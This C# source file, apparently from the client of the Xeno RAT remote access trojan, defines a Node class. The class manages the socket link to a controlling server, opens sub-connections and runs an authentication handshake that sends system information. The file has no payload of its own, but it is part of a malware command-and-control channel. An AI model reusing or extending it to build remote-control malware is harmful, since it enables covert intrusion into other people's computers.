﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_client
{
    public class Node
    {
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int memcmp(byte[] b1, byte[] b2, long count);
        
        private Action<Node> OnDisconnect;
        public List<Node> subNodes = new List<Node>();
        public SocketHandler sock;
        public Node Parent;
        public int ID = -1;
        public int SetId = -1;
        public int SockType = -1;
        public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
        {
            sock = _sock;
            OnDisconnect = _OnDisconnect;
        }
        public void AddSubNode(Node subNode) 
        {
            subNodes.Add(subNode);
        }
        public async void Disconnect()
        {
            try
            {
                if (sock.sock != null)
                {
                    await Task.Factory.FromAsync(sock.sock.BeginDisconnect, sock.sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock.sock?.Close(0);
            }
            sock.sock?.Dispose();
            List<Node> copy = subNodes.ToList();
            subNodes.Clear();
            foreach (Node i in copy)
            {
                i?.Disconnect();
            }
            copy.Clear();
            if (OnDisconnect != null)
            {
                OnDisconnect(this);
            }
        }


        public async Task<Node> ConnectSubSockAsync(int type, int retid, Action<Node> OnDisconnect = null)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                await socket.ConnectAsync(sock.sock.RemoteEndPoint);

                Node sub = await Utils.ConnectAndSetupAsync(socket, sock.EncryptionKey, type, ID, OnDisconnect);
                byte[] byteRetid = new byte[] { (byte)retid };
                await sub.SendAsync(byteRetid);
                byte[] worked = new byte[] { 1 };
                await SendAsync(worked);
                return sub;
            }
            catch
            {
                byte[] worked = new byte[] { 0 };
                await SendAsync(worked);
                return null;
            }
        }
        public bool Connected() 
        {
            try
            {
                return sock.sock.Connected;
            }
            catch
            {
                return false;
            }
        }
        public async Task<byte[]> ReceiveAsync()
        {
            byte[] data = await sock.ReceiveAsync();
            if (data == null)
            {
                Disconnect();
                return null;
            }
            return data;
        }
        public async Task<bool> SendAsync(byte[] data)
        {
            if (!(await sock.SendAsync(data)))
            {
                Disconnect();
                return false;
            }
            return true;
        }
        private bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }
        public void SetRecvTimeout(int ms) 
        {
            sock.SetRecvTimeout(ms);
        }
        public void ResetRecvTimeout()
        {
            sock.ResetRecvTimeout();
        }
        public async Task<bool> AuthenticateAsync(int type, int id = 0, byte[] sysInfo = null)//0 = main, 1 = heartbeat, 2 = anything else
        {
            Thread.Sleep(4000);
            byte[] data;
            try
            {
                byte[] _SockType = sock.IntToBytes(type);
                //return true;
                // 4.client发出请求，type=0
                if (!(await sock.SendAsync(sysInfo, 0)))
                {
                    return false;
                }
                if (type == 0)
                {
                    // 4.server发出请求，connId
                    data = await sock.ReceiveAsync();
                    int connId = sock.BytesToInt(data);
                    string title = "Client.Node.AuthenticateAsync";
                    string message = "connId" + connId;
                    MessageBox.Show(message, title);
                    ID = connId;
                }
                else
                {
                    ID = id;
                    byte[] connId = sock.IntToBytes(id);
                    if (!(await sock.SendAsync(connId)))
                    {
                        return false;
                    }
                }
                SockType = type;
                return true;
            }
            catch(Exception e)
            {
                MessageBox.Show("failed" + e.Message, "Client.Node.AuthenticateAsync");
            }
            return false;
        }
    }
}
